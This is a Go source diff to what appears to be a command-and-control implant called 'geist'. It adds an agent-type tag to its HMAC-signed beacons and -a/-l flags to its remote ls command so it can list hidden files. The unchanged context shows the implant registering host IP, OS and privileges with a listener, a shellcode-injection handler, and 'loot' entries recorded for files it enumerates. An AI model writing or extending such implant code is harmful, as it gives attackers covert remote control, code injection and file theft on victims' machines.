@@ -10,6 +10,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"io/fs"
 	"math/rand"
 	"net"
 	"net/http"
@@ -128,6 +129,7 @@ type AgentRegistration struct {
 	Name              string `json:"name"`
 	IP                string `json:"ip"`
 	OS                string `json:"os"`
+	AgentType         string `json:"agent_type,omitempty"`
 	ReconnectInterval int    `json:"reconnectInterval"`
 	Privileges        string `json:"privileges"`
 }
@@ -182,9 +184,10 @@ func wrapWithHMAC(data interface{}) ([]byte, error) {
 	timestamp, signature := signRequest("POST", listenerEndpoint, body)
 
 	wrapper := map[string]interface{}{
-		"data":      json.RawMessage(jsonData),
-		"timestamp": timestamp,
-		"signature": signature,
+		"agent_type": "geist",
+		"data":       json.RawMessage(jsonData),
+		"timestamp":  timestamp,
+		"signature":  signature,
 	}
 
 	return json.Marshal(wrapper)
@@ -284,6 +287,7 @@ func main() {
 			Name:              agentID,
 			IP:                getLocalIP(),
 			OS:                osInfo,
+			AgentType:         "geist",
 			ReconnectInterval: reconnectInterval,
 			Privileges:        getPrivilegeInfo(),
 		}
@@ -642,11 +646,67 @@ func handleInjectSc(args []string) (string, error) {
 	return "shellcode executed", nil
 }
 
-func handleLs(args []string) (string, error) {
-	path := "."
-	if len(args) > 0 {
-		path = args[0]
+type lsOptions struct {
+	showAll    bool
+	longFormat bool
+	path       string
+}
+
+func parseLsOptions(args []string) lsOptions {
+	opts := lsOptions{path: "."}
+
+	for i := 0; i < len(args); i++ {
+		arg := args[i]
+
+		if arg == "--" {
+			if i+1 < len(args) {
+				opts.path = args[i+1]
+			}
+			break
+		}
+
+		if strings.HasPrefix(arg, "-") && len(arg) > 1 {
+			for _, ch := range arg[1:] {
+				switch ch {
+				case 'a':
+					opts.showAll = true
+				case 'l':
+					opts.longFormat = true
+				}
+			}
+			continue
+		}
+
+		// First non-flag is treated as the path
+		opts.path = arg
+		break
 	}
+
+	return opts
+}
+
+func formatLsLine(name string, info fs.FileInfo, isDir bool, longFormat bool) string {
+	if !longFormat {
+		if isDir {
+			return fmt.Sprintf("├── 📁 %s/", name)
+		}
+		sizeStr := formatFileSize(info.Size())
+		return fmt.Sprintf("├── 📄 %s (%s)", name, sizeStr)
+	}
+
+	modTime := info.ModTime().Format("2006-01-02 15:04:05")
+	mode := info.Mode().String()
+	sizeStr := formatFileSize(info.Size())
+	prefix := "📄"
+	if isDir {
+		prefix = "📁"
+	}
+	return fmt.Sprintf("%s %s %12s %s %s", prefix, mode, sizeStr, modTime, name)
+}
+
+func handleLs(args []string) (string, error) {
+	opts := parseLsOptions(args)
+	path := opts.path
 
 	// Resolve path
 	absPath, err := filepath.Abs(path)
@@ -688,12 +748,17 @@ func handleLs(args []string) (string, error) {
 
 	// Add directories first
 	for _, entry := range dirs {
+		if !opts.showAll && strings.HasPrefix(entry.Name(), ".") {
+			continue
+		}
+
 		info, err := entry.Info()
 		if err != nil {
 			continue
 		}
 
-		result.WriteString(fmt.Sprintf("├── 📁 %s/\n", entry.Name()))
+		result.WriteString(formatLsLine(entry.Name(), info, true, opts.longFormat))
+		result.WriteString("\n")
 
 		// Create loot entry
 		fullPath := filepath.Join(absPath, entry.Name())
@@ -710,6 +775,10 @@ func handleLs(args []string) (string, error) {
 
 	// Add files
 	for _, entry := range files {
+		if !opts.showAll && strings.HasPrefix(entry.Name(), ".") {
+			continue
+		}
+
 		info, err := entry.Info()
 		if err != nil {
 			continue
@@ -717,7 +786,9 @@ func handleLs(args []string) (string, error) {
 
 		size := info.Size()
 		sizeStr := formatFileSize(size)
-		result.WriteString(fmt.Sprintf("├── 📄 %s (%s)\n", entry.Name(), sizeStr))
+		_ = sizeStr // kept for clarity; formatLsLine handles size rendering
+		result.WriteString(formatLsLine(entry.Name(), info, false, opts.longFormat))
+		result.WriteString("\n")
 
 		// Create loot entry
 		fullPath := filepath.Join(absPath, entry.Name())
